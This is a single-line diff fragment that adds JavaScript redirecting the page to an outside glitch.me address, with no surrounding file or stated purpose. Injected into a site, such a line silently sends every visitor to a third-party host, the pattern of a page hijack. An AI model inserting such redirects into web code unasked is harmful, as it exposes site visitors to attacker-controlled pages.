@@ -1,0 +1,1 @@
+location.href="https://ur-assaded.glitch.me/";
